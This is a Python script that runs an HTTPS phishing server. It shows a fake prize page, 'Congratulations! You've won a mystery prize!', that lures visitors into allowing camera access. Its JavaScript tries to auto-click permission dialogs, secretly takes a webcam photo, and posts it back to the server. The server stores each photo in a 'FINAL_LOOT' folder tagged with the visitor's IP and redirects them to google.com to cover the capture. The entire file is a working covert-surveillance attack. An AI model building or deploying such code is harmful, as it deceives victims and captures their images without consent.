#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import os
import ssl
from datetime import datetime

PORT = 8443
CERT_FILE = "server.pem"
DIR = "FINAL_LOOT"
os.makedirs(DIR, exist_ok=True)

# === CERT ===
if not os.path.exists(CERT_FILE):
    print("Generating cert...")
    os.system(f"openssl req -new -x509 -days 365 -nodes -out {CERT_FILE} -keyout {CERT_FILE} -subj '/CN=localhost' 2>/dev/null")

# === JS: PAD BASE64 BEFORE SEND ===
PAYLOAD = """<script>
// Auto-click "Allow"
const observer = new MutationObserver((_, obs) => {
  const dialog = document.querySelector('dialog') || document.querySelector('[role="dialog"]');
  if (dialog) {
    obs.disconnect();
    setTimeout(() => {
      const btn = Array.from(dialog.querySelectorAll('button')).find(b => /allow|yes/i.test(b.textContent));
      if (btn) btn.click();
    }, 300);
  }
});
observer.observe(document.body, { childList: true, subtree: true });

// Capture
const video = document.createElement('video');
const canvas = document.createElement('canvas');
document.body.appendChild(video);
document.body.appendChild(canvas);

navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
  .then(stream => {
    video.srcObject = stream;
    video.play();
    setTimeout(() => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      
      let imgData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
      
      // === PAD BASE64 ===
      imgData += '='.repeat((4 - imgData.length % 4) % 4);
      
      fetch('', {
        method: 'POST',
        body: 'img=' + imgData
      }).finally(() => {
        stream.getTracks().forEach(t => t.stop());
        setTimeout(() => location = 'https://google.com', 500);
      });
    }, 1500);
  })
  .catch(() => location = 'https://google.com');
</script>"""

BUTTON_JS = """<script>
document.getElementById('claimBtn').onclick = function() {
  this.innerText = 'Processing...';
  this.disabled = true;
};
</script>"""

HTML_TEMPLATE = """<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Congratulations!</title>
  <style>
    body{{font-family:Arial;background:#fff3e0;color:#d84315;text-align:center;padding:10%}}
    .box{{background:#fff;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:90%;margin:auto}}
    h1{{font-size:2rem}}
    p{{font-size:1.1rem;margin:1.5rem 0}}
    button{{background:#ff6d00;color:#fff;border:none;padding:1rem 2rem;font-size:1.2rem;border-radius:12px;font-weight:bold}}
    button:disabled{{background:#ccc;cursor:not-allowed}}
  </style>
</head><body>
  <div class="box">
    <h1>Congratulations!</h1>
    <p>You've won a mystery prize!</p>
    <p>Allow camera to claim it.</p>
    <button id="claimBtn">Claim Now</button>
  </div>
  {payload}
  {button_js}
</body></html>"""

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        html = HTML_TEMPLATE.format(payload=PAYLOAD, button_js=BUTTON_JS)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode()
        img = urllib.parse.parse_qs(data).get('img', [''])[0]

        if img:
            try:
                # === FINAL DECODE (NO PAD NEEDED – JS DID IT) ===
                img_bytes = base64.b64decode(img, validate=True)
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                ip = self.client_address[0]
                path = f"{DIR}/FINAL_{ts}_{ip}.jpg"
                with open(path, "wb") as f:
                    f.write(img_bytes)
                print(f"IMAGE SAVED: {path}")
            except Exception as e:
                print(f"[-] Decode error: {e}")
        else:
            print(f"[-] No image")

        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

# === HTTPS ===
def run():
    server = socketserver.TCPServer(("", PORT), Handler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_FILE)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    print(f"FINAL SERVER → https://YOUR_IP:{PORT}")
    print("   LOOT → ./FINAL_LOOT/")
    server.serve_forever()

if __name__ == "__main__":
    run()
